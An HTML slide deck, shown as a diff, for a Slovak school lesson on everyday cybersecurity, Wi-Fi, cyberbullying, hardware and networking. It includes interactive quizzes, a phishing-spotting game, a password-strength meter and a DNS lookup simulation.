+      <p>Na HTTP stránke ide heslo po sieti ako <b>čitateľný text</b>. Ktokoľvek na tej istej Wi-Fi ho vie odchytiť.</p>
+      <pre style="font-size:.8em"><span class="c">HTTP – to, čo vidí útočník:</span>
+POST /login
+user=marek&amp;pass=<span class="r">tajneheslo1</span>
+
+<span class="c">HTTPS – to isté zašifrované:</span>
+<span class="s">a7f3d9e1b0c4…8f2a</span></pre>
+      <div class="ex"><b>Pravidlo:</b> žiadne heslo, karta ani osobné údaje na stránke bez <code>https://</code> a zámku.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Wi-Fi doma a v škole</h2>
+  <div class="grid g3">
+    <div class="card good"><h3>Zabezpečenie</h3><p><b>WPA3</b> (najnovšie) &gt; WPA2 &gt; WPA &gt; WEP (prelomiteľné za minúty) &gt; otvorená sieť bez hesla.</p></div>
+    <div class="card warn"><h3>Typické chyby</h3><p>Ponechané výrobné heslo routra (<code>admin/admin</code>) · zapnutý WPS · neaktualizovaný firmvér · SSID prezrádzajúce meno majiteľa.</p></div>
+    <div class="card info"><h3>Pásma</h3><p><b>2,4 GHz</b> – ďalší dosah, pomalšie, rušené. <b>5 GHz</b> – rýchlejšie, kratší dosah, horšie cez múry.</p></div>
+  </div>
+  <div class="card bad" style="margin-top:12px"><b>Spojenie s 1. časťou:</b> verejná otvorená Wi-Fi je ideálne miesto pre <b>Man-in-the-Middle</b>. Ak je pripojenie nevyhnutné: používať len HTTPS stránky, neriešiť banku a ideálne zapnúť VPN.</div>
+</section>
+
+<!-- ============ ZHRNUTIE + OPAKOVANIE ============ -->
+<section class="slide" data-sec="Zhrnutie">
+  <h2>Zhrnutie – 5 vecí, ktoré treba vedieť</h2>
+  <ol class="num" style="font-size:1.05em;max-width:80ch;margin-top:.8em">
+    <li><b>Najzraniteľnejšia časť systému je človek.</b> Phishing a sociálne inžinierstvo obídu aj najlepší antivírus.</li>
+    <li><b>Dlhé unikátne heslo + 2FA + zálohy</b> pokryjú 90 % bežných rizík.</li>
+    <li><b>Pri kyberšikane: neodpovedať, uložiť dôkazy, nahlásiť, povedať dospelému.</b> Mlčanie ju len predlžuje.</li>
+    <li><b>Hardvér = vstup, spracovanie (CPU + RAM), výstup, uchovanie.</b> Softvér hardvéru hovorí, čo má robiť.</li>
+    <li><b>V sieti IP hovorí kde si, MAC kto si, DNS prekladá meno na adresu</b> – a HTTPS je to, čo chráni obsah cestou.</li>
+  </ol>
+</section>
+
+<!-- generované opakovacie slidy sa vložia sem -->
+
+<section class="slide" data-sec="Test" id="lastSlide">
+  <div class="eyebrow">Záverečné overenie</div>
+  <h2>Veľký opakovací test</h2>
+  <p class="lead">30 otázok zo všetkých piatich okruhov, okamžité vyhodnotenie, percentá aj vysvetlenie ku každej otázke.</p>
+  <a class="cta" href="test.html">Spustiť test (30 otázok) →</a>
+  <p class="small" style="margin-top:1.4em">Tip: test sa dá opakovať ľubovoľne veľakrát – po vyhodnotení je pri každej otázke vysvetlené, prečo je správna práve tá odpoveď.</p>
+</section>
+
+</div>
+
+<div id="nav">
+  <button id="prev" title="Predchádzajúci slide (←)">‹</button>
+  <button id="next" title="Ďalší slide (→)">›</button>
+</div>
+<div id="hint">← → alebo medzerník · <b>F</b> celá obrazovka</div>
+
+<script>
+/* ---------- opakovacie otázky (blok slidov pred testom) ---------- */
+const review = [
+  {q:"Príde SMS: „Vaša zásielka čaká na doplatok 1,90 €, potvrďte na packeta-platba.xyz“. O aký útok ide?",
+   o:["Ransomvér","Smishing (phishing cez SMS)","DDoS útok","SQL injection"],c:1,
+   e:"Phishing cez SMS = smishing. Poznávacie znaky: malá suma (aby sa nad ňou nerozmýšľalo), tlak na rýchlosť a podozrivá doména."},
+  {q:"Vypadne elektrina a rozpísaný dokument je preč. Prečo?",
+   o:["Pokazil sa procesor","Dáta boli len v RAM, ktorá je prchavá","SSD sa vymazal","Chýbal ovládač"],c:1,
+   e:"RAM je prchavá pamäť – bez napájania sa jej obsah stratí. Na disk sa dáta zapíšu až uložením."},
+  {q:"Čo je hlavná úloha routra?",
+   o:["Rozvádza elektrinu do komponentov","Spája dve rôzne siete a hľadá cestu paketu","Zosilňuje signál monitora","Ukladá dáta natrvalo"],c:1,
+   e:"Router smeruje pakety medzi sieťami – napríklad z domácej LAN do internetu."},
+  {q:"Spolužiak dostáva výhražné správy z fake profilu. Čo mu poradiť ako prvé?",
+   o:["Nech odpovie rovnako ostro","Nech správy zmaže a zabudne na to","Nech si uloží screenshoty a povie to dospelému","Nech si zmení meno na profile"],c:2,
+   e:"Dôkazy sa nemažú – bez nich sa vec nedá riešiť. Nasleduje blokovanie, nahlásenie a informovanie dospelého."},
+  {q:"Ktorá dvojica je správne zaradená?",
+   o:["Windows = aplikačný softvér","GIMP = firmvér","BIOS/UEFI = firmvér","Ovládač tlačiarne = hardvér"],c:2,
+   e:"BIOS/UEFI je program uložený v čipe základnej dosky, teda firmvér. Windows je systémový softvér, GIMP aplikačný."},
+  {q:"Prečo sa na verejnej Wi-Fi nemá zadávať heslo do banky na stránke s http://?",
+   o:["Lebo je to pomalé","Lebo prenos nie je šifrovaný a dá sa odchytiť","Lebo banka to zakazuje","Lebo sa minú mobilné dáta"],c:1,
+   e:"HTTP prenáša údaje čitateľne. Útočník na tej istej sieti (Man-in-the-Middle) ich vidí. HTTPS ich šifruje."}
+];
+
+const deck=document.getElementById('deck'), lastS=document.getElementById('lastSlide');
+review.forEach((r,i)=>{
+  const s=document.createElement('section');
+  s.className='slide'; s.dataset.sec='Opakovanie';
+  s.innerHTML='<div class="eyebrow">Opakovacia otázka '+(i+1)+' / '+review.length+'</div>'+
+    '<h2 style="font-size:clamp(1.25em,2.4vw,1.75em)">'+r.q+'</h2><div class="qbox" style="margin-top:1em">'+
+    r.o.map((t,j)=>'<button class="opt" data-j="'+j+'">'+t+'</button>').join('')+
+    '</div><div class="fb"></div>';
+  deck.insertBefore(s,lastS);
+  const fb=s.querySelector('.fb');
+  s.querySelectorAll('.opt').forEach(b=>b.addEventListener('click',()=>{
+    const ok=+b.dataset.j===r.c;
+    s.querySelectorAll('.opt').forEach((x,j)=>{x.disabled=true; if(j===r.c)x.classList.add('ok'); });
+    if(!ok) b.classList.add('no');
+    fb.className='fb show '+(ok?'ok':'no');
+    fb.innerHTML=(ok?'✅ <b>Správne.</b> ':'❌ <b>Nie celkom.</b> ')+r.e;
+  }));
+});
+
+/* ---------- slide engine ---------- */
+const slides=[...document.querySelectorAll('.slide')];
+let i=0;
+function show(n){
+  i=Math.max(0,Math.min(slides.length-1,n));
+  slides.forEach((s,k)=>s.classList.toggle('on',k===i));
+  document.getElementById('secName').textContent=slides[i].dataset.sec||'Informatika';
+  document.getElementById('cnt').textContent=(i+1)+' / '+slides.length;
+  document.getElementById('prog').style.width=((i+1)/slides.length*100)+'%';
+  slides[i].scrollTop=0;
+  try{history.replaceState(null,'','#'+(i+1));}catch(e){}
+}
+document.getElementById('next').onclick=()=>show(i+1);
+document.getElementById('prev').onclick=()=>show(i-1);
+addEventListener('keydown',e=>{
+  if(e.target.matches('button'))return;
+  if(e.target.matches('input,textarea')&&!['ArrowLeft','ArrowRight'].includes(e.key))return;
+  if(['ArrowRight','PageDown',' '].includes(e.key)){e.preventDefault();show(i+1);}
+  if(['ArrowLeft','PageUp'].includes(e.key)){e.preventDefault();show(i-1);}
+  if(e.key==='Home')show(0); if(e.key==='End')show(slides.length-1);
+  if(e.key==='f'||e.key==='F'){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen();}
+});
+let tx=0;
+addEventListener('touchstart',e=>tx=e.changedTouches[0].clientX,{passive:true});
+addEventListener('touchend',e=>{const d=e.changedTouches[0].clientX-tx;
+  if(Math.abs(d)>70) d<0?show(i+1):show(i-1);},{passive:true});
+show(location.hash?parseInt(location.hash.slice(1))-1||0:0);
+
+/* ---------- phishing hunt ---------- */
+let ph=0;
+document.querySelectorAll('.hit').forEach(h=>h.addEventListener('click',()=>{
+  if(h.classList.contains('found'))return;
+  if(h.dataset.bad==='1'){
+    h.classList.add('found'); ph++;
+    document.getElementById('phCnt').textContent=ph+' / 5';
+    const d=document.createElement('div'); d.textContent='✅ '+h.dataset.why;
+    document.getElementById('phNotes').appendChild(d);
+    if(ph===5){const f=document.createElement('div');f.style.background='#E9ECFF';
+      f.innerHTML='<b>Výborne – nájdených všetkých 5.</b> Stačí, aby sedel jediný z nich, a e-mail je podozrivý.';
+      document.getElementById('phNotes').appendChild(f);}
+  } else { h.classList.add('miss'); setTimeout(()=>h.classList.remove('miss'),400); }
+}));
+
+/* ---------- password meter ---------- */
+const pw=document.getElementById('pw'),pwBar=document.getElementById('pwBar'),pwOut=document.getElementById('pwOut');
+pw.addEventListener('input',()=>{
+  const v=pw.value;
+  if(!v){pwBar.style.width='0';pwOut.textContent='—';return;}
+  let set=0;
+  if(/[a-z]/.test(v))set+=26; if(/[A-Z]/.test(v))set+=26;
+  if(/[0-9]/.test(v))set+=10; if(/[^a-zA-Z0-9]/.test(v))set+=33;
+  const common=['heslo','password','123456','qwerty','admin','futbal','slovensko','111111'];
+  const weak=common.some(c=>v.toLowerCase().includes(c));
+  const bits=v.length*Math.log2(set||1);
+  const sec=Math.pow(2,bits)/2/1e10;
+  let t;
+  if(weak) t='okamžite (je v slovníku najčastejších hesiel!)';
+  else if(sec<1)t='menej ako sekundu';
+  else if(sec<3600)t=Math.round(sec)+' s';
+  else if(sec<86400)t=Math.round(sec/3600)+' hodín';
+  else if(sec<3.15e7)t=Math.round(sec/86400)+' dní';
+  else if(sec<3.15e10)t=Math.round(sec/3.15e7)+' rokov';
+  else t=(sec/3.15e7).toExponential(1).replace('e+',' × 10^')+' rokov';
+  const score=weak?4:Math.min(100,bits/90*100);
+  pwBar.style.width=score+'%';
+  pwBar.style.background=score<35?'var(--danger)':score<70?'var(--amber)':'var(--teal)';
+  pwOut.innerHTML='Prelomenie hrubou silou: <b>'+t+'</b> &nbsp;·&nbsp; '+v.length+' znakov, abeceda '+set+' znakov';
+});
+
+/* ---------- kyberšikana quiz ---------- */
+(function(){
+  const box=document.getElementById('ksQ'),fb=document.getElementById('ksF');
+  box.querySelectorAll('.opt').forEach(b=>b.addEventListener('click',()=>{
+    const ok=b.dataset.ok==='1';
+    box.querySelectorAll('.opt').forEach(x=>{x.disabled=true;if(x.dataset.ok==='1')x.classList.add('ok');});
+    if(!ok)b.classList.add('no');
+    fb.className='fb show '+(ok?'ok':'no');
+    fb.innerHTML=ok?'✅ <b>Presne tak.</b> Dôkaz je najdôležitejší – bez neho škola ani polícia nemá s čím pracovať. Až potom blokovať a nahlásiť.'
+      :'❌ <b>Nie.</b> Odpovedať alebo oplácať robí z obete spolupáchateľa, zmazanie profilu zničí dôkazy. Správne je: <b>uložiť dôkazy → povedať dospelému → blokovať a nahlásiť</b>.';
+  }));
+})();
+
+/* ---------- hardvér matching ---------- */
+(function(){
+  const pairs=[
+    {k:'CPU',f:'Vykonáva inštrukcie a výpočty – „mozog“ počítača'},
+    {k:'RAM',f:'Dočasná pracovná pamäť, po vypnutí sa vymaže'},
+    {k:'SSD',f:'Trvalé uloženie dát bez pohyblivých častí'},
+    {k:'Základná doska',f:'Prepája všetky komponenty a umožňuje im komunikovať'},
+    {k:'PSU (zdroj)',f:'Mení 230 V zo zásuvky na napätie pre komponenty'},
+    {k:'GPU',f:'Počíta obraz, 3D grafiku a video'}
+  ];
+  const pool=document.getElementById('hwPool'),zones=document.getElementById('hwZones'),out=document.getElementById('hwOut');
+  let sel=null;
+  function build(){
+    pool.innerHTML='';zones.innerHTML='';out.textContent='';sel=null;
+    [...pairs].sort(()=>Math.random()-.5).forEach(p=>{
+      const b=document.createElement('button');b.textContent=p.k;b.dataset.k=p.k;
+      b.onclick=()=>{pool.querySelectorAll('button').forEach(x=>x.classList.remove('sel'));
+        b.classList.add('sel');sel=b;};
+      pool.appendChild(b);
+    });
+    [...pairs].sort(()=>Math.random()-.5).forEach(p=>{
+      const z=document.createElement('div');z.className='zone';z.dataset.f=p.k;
+      z.innerHTML='<span class="slot">sem kliknúť</span><span>'+p.f+'</span>';
+      z.onclick=()=>{
+        const slot=z.querySelector('.slot');
+        if(slot.classList.contains('filled')&&!sel){
+          const k=slot.dataset.k;
+          pool.querySelector('[data-k="'+k+'"]').classList.remove('used');
+          slot.classList.remove('filled');slot.textContent='sem kliknúť';delete slot.dataset.k;
+          z.className='zone';return;
+        }
+        if(!sel)return;
+        if(slot.classList.contains('filled'))
+          pool.querySelector('[data-k="'+slot.dataset.k+'"]').classList.remove('used');
+        slot.classList.add('filled');slot.textContent=sel.dataset.k;slot.dataset.k=sel.dataset.k;
+        sel.classList.add('used');sel.classList.remove('sel');sel=null;z.className='zone';
+      };
+      zones.appendChild(z);
+    });
+  }
+  document.getElementById('hwCheck').onclick=()=>{
+    let ok=0,done=0;
+    zones.querySelectorAll('.zone').forEach(z=>{
+      const s=z.querySelector('.slot');
+      if(!s.classList.contains('filled')){z.className='zone';return;}
+      done++;
+      if(s.dataset.k===z.dataset.f){z.className='zone ok';ok++;}else{z.className='zone no';}
+    });
+    out.innerHTML=done<pairs.length?'Doplň ešte '+(pairs.length-done)+' priradení.'
+      :(ok===pairs.length?'<span style="color:var(--teal)">🎉 Všetkých '+pairs.length+' správne!</span>'
+      :'<span style="color:var(--danger)">Správne: '+ok+' / '+pairs.length+' – červené oprav.</span>');
+  };
+  document.getElementById('hwReset').onclick=build;
+  build();
+})();
+
+/* ---------- code runner ---------- */
+document.getElementById('runBtn').onclick=()=>{
+  const out=document.getElementById('out');let buf=[];
+  const print=(...a)=>buf.push(a.join(' '));
+  try{ new Function('print','console',document.getElementById('code').value)(print,{log:print});
+    out.textContent=buf.length?buf.join('\n'):'(program nič nevypísal – použi print(...))';
+    out.style.color='#7EE0C6';
+  }catch(err){ out.textContent='⚠ Chyba: '+err.message; out.style.color='#FF9AA2'; }
+};
+
+/* ---------- network simulation ---------- */
+document.getElementById('netRun').onclick=()=>{
+  const dom=(document.getElementById('url').value||'www.spsza.sk').replace(/^https?:\/\//,'').replace(/\/.*$/,'');
+  const log=document.getElementById('netLog'),nodes=[...document.querySelectorAll('#netNodes .node')];
+  const ip='93.184.'+(Math.floor(Math.random()*200)+10)+'.'+(Math.floor(Math.random()*200)+10);
+  const steps=[
+    [0,'💻 PC: zadaná doména '+dom+' → hľadá sa IP adresa. V lokálnej cache nie je.'],
+    [1,'🌐 Router: požiadavka odchádza z LAN (192.168.1.14) cez NAT do internetu.'],
+    [2,'📖 DNS server: '+dom+' = '+ip+' → odpoveď sa posiela späť.'],
+    [3,'🏢 Web server '+ip+': prijatá HTTPS požiadavka GET / na porte 443, odosiela sa HTML.'],
+    [4,'🖥️ Prehliadač: dáta prišli v paketoch, stránka sa skladá a vykresľuje. Hotovo ✔']
+  ];
+  log.textContent='';nodes.forEach(n=>n.classList.remove('act'));
+  steps.forEach((s,k)=>setTimeout(()=>{
+    nodes.forEach(n=>n.classList.remove('act'));
+    nodes[s[0]].classList.add('act');
+    log.textContent+=(k+1)+'. '+s[1]+'\n';
+  },k*950));
+};
+
+/* ---------- animácia cyklu CPU ---------- */
+(function(){
+  const st=[...document.querySelectorAll('#cpuCycle .st')];if(!st.length)return;let k=0;
+  setInterval(()=>{st.forEach((s,j)=>s.classList.toggle('on',j===k));k=(k+1)%st.length;},950);
+})();
+
+/* ---------- RAM: čo sa stane po vypnutí prúdu ---------- */
+(function(){
+  const btn=document.getElementById('ramBtn');if(!btn)return;
+  const msg=document.getElementById('ramMsg');let off=false;
+  btn.onclick=()=>{
+    off=!off;
+    document.querySelectorAll('#ramCells .cell').forEach((c,k)=>
+      setTimeout(()=>c.classList.toggle('gone',off),k*100));
+    btn.textContent=off?'⚡ Zapnúť PC':'⏻ Vypnúť prúd';
+    msg.innerHTML=off
+      ?'<b style="color:var(--danger)">RAM je prázdna</b> – neuložená práca je nenávratne preč. Na disku dáta ostali.'
+      :'Systém a programy sa načítali do RAM <b>nanovo</b> – staré neuložené dáta sa už nevrátia.';
+  };
+})();
+
+/* ---------- pretek HDD vs SSD ---------- */
+(function(){
+  const btn=document.getElementById('raceBtn');if(!btn)return;
+  const SCALE=15;
+  btn.onclick=()=>{
+    [{id:'hdd',sec:78},{id:'ssd',sec:11}].forEach(l=>{
+      const bar=document.getElementById(l.id+'Bar'),t=document.getElementById(l.id+'T'),dur=l.sec/SCALE;
+      bar.style.transition='none';bar.style.width='0';t.textContent='0 s';
+      void bar.offsetWidth;
+      bar.style.transition='width '+dur+'s linear';bar.style.width='100%';
+      const t0=performance.now();
+      const step=now=>{const p=Math.min(1,(now-t0)/(dur*1000));
+        t.textContent=Math.round(p*l.sec)+' s';if(p<1)requestAnimationFrame(step);};
+      requestAnimationFrame(step);
+    });
+  };
+})();
+
+/* ---------- šírenie príspevku (kyberšikana) ---------- */
+(function(){
+  const box=document.getElementById('spread');if(!box)return;
+  const stages=[[1,'1 správa'],[4,'skupinový chat'],[14,'celá trieda'],[46,'škola + cudzí ľudia']];
+  function build(){
+    box.innerHTML=stages.map((s,k)=>
+      '<div><div class="dots">'+Array.from({length:s[0]},(_,j)=>
+        '<i class="dot" style="animation-delay:'+(k*.85+j*.025).toFixed(2)+'s"></i>').join('')+
+      '</div><span style="animation-delay:'+(k*.85+.25).toFixed(2)+'s">'+s[1]+'</span></div>').join('');
+  }
+  build();setInterval(build,7000);
+})();
+
+/* ============ čítanie nahlas ============ */
+(function(){
+  const S=window.speechSynthesis,btn=document.getElementById('ttsBtn'),
+        lbl=document.getElementById('ttsLbl');
+  if(!S||!btn){if(btn)btn.style.display='none';return;}
+  let voice=null,list=[],pos=0,state='idle',warned=false;
+
+  /* prehliadač načítava hlasy asynchrónne, preto aj poslucháč na voiceschanged */
+  const pickVoice=()=>{const v=S.getVoices();
+    voice=v.find(x=>/^sk/i.test(x.lang))||v.find(x=>/^cs/i.test(x.lang))||null;};
+  pickVoice();S.addEventListener('voiceschanged',pickVoice);
+
+  const clean=e=>{const c=e.cloneNode(true);
+    c.querySelectorAll('button,input,textarea,select,svg,canvas,table,.codeout,.noread')
+      .forEach(n=>n.remove());
+    return c.textContent.replace(/\s+/g,' ').trim();};
+
+  function collect(root){
+    const all=[...root.querySelectorAll('h1,h2,h3,h4,p,li,.ex')],set=new Set(all);
+    return all.filter(e=>{                 // vnorené prvky sa nečítajú dvakrát
+      let a=e.parentElement;
+      while(a&&a!==root){if(set.has(a))return false;a=a.parentElement;}
+      return clean(e).length>1;
+    });
+  }
+  function mark(e){
+    document.querySelectorAll('.speaking').forEach(n=>n.classList.remove('speaking'));
+    if(e){e.classList.add('speaking');e.scrollIntoView({behavior:'smooth',block:'nearest'});}
+  }
+  function ui(){
+    lbl.textContent=state==='play'?'Pauza':state==='pause'?'Pokračovať':'Čítať';
+    btn.classList.toggle('active',state!=='idle');
+    btn.classList.toggle('playing',state==='play');
+    btn.classList.toggle('paused',state==='pause');
+  }
+  function next(){
+    if(state!=='play')return;
+    if(pos>=list.length){stop();return;}
+    const e=list[pos],u=new SpeechSynthesisUtterance(clean(e));
+    mark(e);
+    u.lang='sk-SK';if(voice)u.voice=voice;u.rate=.97;
+    u.onend=()=>{pos++;next();};
+    u.onerror=()=>{pos++;next();};
+    S.speak(u);
+  }
+  function start(){
+    S.cancel();list=collect(slides[i]);pos=0;
+    if(!list.length)return;
+    state='play';ui();notice();next();
+  }
+  function stop(){state='idle';S.cancel();mark(null);ui();}
+  function notice(){
+    if(warned)return;warned=true;
+    if(voice&&/^sk/i.test(voice.lang))return;
+    const d=document.createElement('div');d.className='ttsnote';
+    d.textContent=voice
+      ? 'Slovenský hlas nie je v systéme nainštalovaný, text číta hlas „'+voice.name+'“.'
+      : 'V systéme nie je nainštalovaný slovenský hlas. Doplniť sa dá v Nastavenia → Čas a jazyk → Reč.';
+    document.body.appendChild(d);
+    setTimeout(()=>d.remove(),8000);
+  }
+  btn.onclick=()=>{
+    if(state==='idle')start();
+    else if(state==='play'){state='pause';S.pause();ui();}
+    else{state='play';S.resume();ui();}
+  };
+  addEventListener('keydown',e=>{
+    if(e.target.matches('input,textarea,select,button'))return;
+    if(e.key==='c'||e.key==='C'){e.preventDefault();btn.onclick();}
+  });
+  const orig=show;                          // prepnutie slidu čítanie ukončí
+  show=function(n){stop();orig(n);};
+  document.addEventListener('visibilitychange',()=>{if(document.hidden)stop();});
+  addEventListener('beforeunload',()=>S.cancel());
+  ui();
+})();
+</script>
+</body>
+</html>
